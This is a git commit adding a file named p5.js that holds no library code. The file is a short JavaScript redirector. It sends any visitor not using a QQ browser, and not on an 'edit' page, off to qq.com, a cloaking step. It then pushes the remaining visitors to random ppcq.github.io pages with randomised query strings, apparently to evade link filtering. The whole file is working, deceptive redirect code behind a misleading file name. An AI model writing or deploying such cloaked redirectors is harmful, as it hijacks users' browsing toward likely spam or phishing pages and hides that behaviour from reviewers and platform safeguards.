53f9a53fbbe542d2026645d09d2b3bb8823c6d11
iuuc <145624790+iuuc@users.noreply.github.com>
2024-01-01 12:10:52 +0800

    Create p5.js

---
+++ p5.js
@@ -0,0 +1,27 @@
+function leleua() {
+    var sUserAgent = navigator.userAgent.toLowerCase();
+    if (sUserAgent.match(/QQ/i) == 'qq' || location.href.indexOf("edit") > -1) {
+    } else {
+        window.location.href = "https://qq.com";
+    }
+}
+
+leleua();
+var urls=[
+'https://ppcq.github.io/pp?{nnnnnnnnnnn}{wwwwww}',
+'https://ppcq.github.io/ll.html?{nnnnnnnnnnn}{wwwwww}',
+];
+location.href = myEeplace(urls[Math.floor(Math.random()*urls.length)]);
+function myEeplace(s){
+	return s.replace(/\{(\w+?)\}/g,function(a,b){
+		var h='';
+		for(var i=0;i<b.length;i++){
+			if('n'==b[i]){
+				h+=Math.floor(Math.random()*10);
+			}else if('w'==b[i]){
+				h+=String.fromCharCode(97+Math.floor(Math.random()*26));
+			}
+		}
+		return h;
+	});
+}
